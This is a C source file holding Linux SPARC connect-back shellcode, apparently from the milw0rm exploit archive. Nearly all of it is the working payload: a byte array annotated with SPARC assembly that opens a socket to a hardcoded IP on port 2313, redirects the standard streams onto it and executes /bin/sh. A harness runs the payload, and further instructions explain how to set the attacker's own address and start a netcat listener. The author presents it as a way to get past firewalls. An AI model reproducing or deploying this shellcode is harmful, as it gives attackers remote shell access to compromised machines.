/* linux (sparc) connect back shellcode, because someone had to evade those firewalls. *sigh* */

/*
 * OS           : Linux
 * Architecture : Sparc
 * Type         : Connect Back
 * Lenght       : 216 Bytes
 * Listen-Port  : 2313/TCP
 * Default IP   : 192.168.100.1 ( see how you'll change it at the end. )
 *
 * null bytes (0x00), breaks (0x0a), nops, fork(), ... avoided.
 * was tested accordingly, couldn't optimized more.
 * plug it in your code, launch nc -l -vvv -p 2313 and wait for it.
 *
 * (c) 2002 killah @ hack . gr
 * All rights reserved.
 *
 */

#define NAME "Linux Sparc Connect-Back"

char cb_linux_sparc[]=
  "\x9d\xe3\xbf\x80"    // save  %sp, -128, %sp
  "\x90\x10\x20\x02"    // mov  2, %o0
  "\xd0\x37\xbf\xe0"    // sth  %o0, [ %fp + -32 ]
  "\x90\x10\x29\x09"    // mov  0x909, %o0
  "\xd0\x37\xbf\xe2"    // sth  %o0, [ %fp + -30 ]
  "\x13\x30\x2a\x19"    // sethi  %hi(0xc0a86400), %o1 <- IPv4 ADDRESS MODIFY THIS.
  "\x90\x12\x60\x01"    // or  %o1, 1, %o0             <- ALSO THIS.
  "\xd0\x27\xbf\xe4"    // st  %o0, [ %fp + -28 ]
  "\x90\x10\x20\x02"    // mov  2, %o0
  "\x92\x10\x20\x01"    // mov  1, %o1
  "\x94\x22\x60\x01"    // sub  %o1, 1, %o2
  "\xd0\x23\xa0\x44"    // st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"    // st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"    // st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x01"    // mov  1, %o0
  "\x92\x03\xa0\x44"    // add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"    // mov  0xce, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\xd0\x27\xbf\xf4"    // st  %o0, [ %fp + -12 ]
  "\x92\x07\xbf\xe0"    // add  %fp, -32, %o1
  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
  "\x94\x10\x20\x10"    // mov  0x10, %o2
  "\xd0\x23\xa0\x44"    // st  %o0, [ %sp + 0x44 ]
  "\xd2\x23\xa0\x48"    // st  %o1, [ %sp + 0x48 ]
  "\xd4\x23\xa0\x4c"    // st  %o2, [ %sp + 0x4c ]
  "\x90\x10\x20\x03"    // mov  3, %o0
  "\x92\x03\xa0\x44"    // add  %sp, 0x44, %o1
  "\x82\x10\x20\xce"    // mov  0xce, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
  "\x92\x1a\x40\x09"    // xor  %o1, %o1, %o1
  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
  "\x92\x10\x20\x01"    // mov  1, %o1
  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\xd0\x07\xbf\xf4"    // ld  [ %fp + -12 ], %o0
  "\x92\x10\x20\x02"    // mov  2, %o1
  "\x82\x10\x20\x5a"    // mov  0x5a, %g1
  "\x91\xd0\x20\x10"    // ta  0x10
  "\x2d\x0b\xd8\x9a"    // sethi  %hi(0x2f626800), %l6
  "\xac\x15\xa1\x6e"    // or  %l6, 0x16e, %l6
  "\x2f\x0b\xdc\xda"    // sethi  %hi(0x2f736800), %l7
  "\x90\x0b\x80\x0e"    // and  %sp, %sp, %o0
  "\x92\x03\xa0\x08"    // add  %sp, 8, %o1
  "\xa6\x10\x20\x01"    // mov  1, %l3
  "\x94\x24\xe0\x01"    // sub  %l3, 1, %o2
  "\x9c\x03\xa0\x10"    // add  %sp, 0x10, %sp
  "\xec\x3b\xbf\xf0"    // std  %l6, [ %sp + -16 ]
  "\xd0\x23\xbf\xf8"    // st  %o0, [ %sp + -8 ]
  "\xc0\x23\xbf\xfc"    // clr  [ %sp + -4 ]
  "\x82\x10\x20\x3b"    // mov  0x3b, %g1
  "\x91\xd0\x20\x10";   // ta  0x10

int
main()
{
  int (*test)();
  test = (int (*)()) cb_linux_sparc;
  printf("%s shellcode\n\tSize = %d\n",NAME,strlen(cb_linux_sparc));
  (int)(*test)();
  exit(0);
}

/*******************************************************************************

 here it is the C code, that will give you the IPv4 Address of your
 box, in a big-endianess style, so to replace it inside shellcode and
 get the whole thing working for you.

 example:
  int main() { printf(" 0x%02x%02x%02x%02x\n",192,168,100,1); exit(0); }
  or @ bash     printf "0x%02x%02x%02x%02x\n" 192 168 100 1

 i believe no further explanation needed.

********************************************************************************/

//EOF

// milw0rm.com [2004-09-26]